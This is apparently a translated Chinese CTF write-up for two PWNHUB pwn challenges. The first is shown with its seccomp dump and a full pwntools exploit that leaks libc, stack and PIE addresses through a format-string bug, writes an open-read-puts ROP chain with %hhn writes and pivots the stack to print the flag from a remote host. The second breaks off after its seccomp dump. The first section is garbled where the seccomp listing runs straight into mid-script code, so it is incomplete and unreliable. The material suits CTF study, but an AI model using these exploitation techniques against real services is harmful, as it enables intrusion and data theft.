# PWNHUB双蛋赛pwn题解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
pwnhub的2道pwn题目，一道格式化字符串的题目，一道libc-2.31的堆题目。题目的逆向量都不大，程序分析起来比较容易，更关注的是利用的手法。下面直接进入正题。
## 公开赛题目
###  0x00 程序分析&&漏洞分析
一打开就看到了挺烦人的prctl的函数，进行了沙箱设置，使用seccomp工具进行分析
    //seccomp-tools dump ./easypwn
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A >16)&0xffff)
        write(pie+0x202500+offset+4,(val>>32)&0xffff)
    def write_stack_addr(offset,val):
        write(stack+offset,val&0xffff)
        write(stack+offset+2,(val>>16)&0xffff)
        write(stack+offset+4,(val>>32)&0xffff)
    #p=process('./easypwn')
    p=remote('139.217.102.146',33865)
    debug()
    #leak stak libc && pie
    #test 0x7ffe4279d630 0x7fcf97582840 
    p.sendafter('name?','%19$p%14$p%18$p')
    p.recvuntil('0x')
    libcbase=int(p.recv(12),16)-0x20840
    log.success("libc -->"+hex(libcbase))
    p.recvuntil('0x')
    stack=int(p.recv(12),16)
    log.success("stack -->"+hex(stack))
    p.recvuntil('0x')
    pie=int(p.recv(12),16)-0xd70
    log.success("pie -->"+hex(pie))
    p.sendlineafter("how old are you??",str(100))
    debug()
    ## make loop \x00  -- is iok
    name='%'+str(0x3a)+"c"+"%10$hhnaaaaa"+p64(stack-0x18)
    p.sendafter('name?',name)
    p.sendlineafter("how old are you??",str(100))
    pop_rdi=0x0000000000021112+libcbase
    pop_rsi=0x00000000000202f8+libcbase
    pop_rdx=0x0000000000001b92+libcbase
    open_addr = 0xf70f0 + libcbase
    read_addr = 0xf7310 + libcbase
    puts_addr = 0x6f6a0 + libcbase
    leave_ret_addr = 0x0000000000042361 + libcbase
    #log.success("pop_rdi is " + hex(pop_rdi))
    #write(stack+8,pop_rdi&0xffff)
    #write(stack+8+2,(pop_rdi>>16)&0xffff)
    #write(stack+8+2+2,(pop_rdi>>32)&0xffff)
    write_addr(8,pop_rdi)
    write_addr(0x10,pie+0x202060)#./flag
    write_addr(0x18,pop_rsi)
    #write_addr(0x20,0)
    write_addr(0x28,open_addr)
    write_addr(0x30,pop_rdi)
    write_addr(0x38,3)
    write_addr(0x40,pop_rsi)
    write_addr(0x48,pie+0x202060)
    write_addr(0x50,pop_rdx)
    write_addr(0x58,0x50)#once
    write_addr(0x60,read_addr)
    write_addr(0x68,pop_rdi)
    write_addr(0x70,pie+0x202060)
    write_addr(0x78,puts_addr)
    write_stack_addr(0,pie+0x202500)
    write_stack_addr(8,leave_ret_addr)
    p.sendafter('name?','./flag\x00')
    p.sendlineafter("how old are you??",str(100))
    p.sendafter('name?','./flag\x00')
    p.sendlineafter("how old are you??",str(100))
    debug()
    p.interactive()
    //flag{48e13dc24d00405599522395a6160972}
最终拿到flag
## 内部赛题目
###  0x00 程序分析&&漏洞分析
同样的也设置了沙箱规则，禁用了execve，同样的需要orw来读取flag
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
     0004: 0x15 0x06 0x00 0x00000029  if (A == socket) goto 0011
     0005: 0x15 0x05 0x00 0x0000002a  if (A == connect) goto 0011
     0006: 0x15 0x04 0x00 0x00000031  if (A == bind) goto 0011
     0007: 0x15 0x03 0x00 0x00000032  if (A == listen) goto 0011
     0008: 0x15 0x02 0x00 0x00000038  if (A == clone) goto 0011
     0009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0011
     0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0011: 0x06 0x00 0x00 0x00000000  return KILL
经典的堆菜单题目，下面对程序的基本功能进行简单的分析：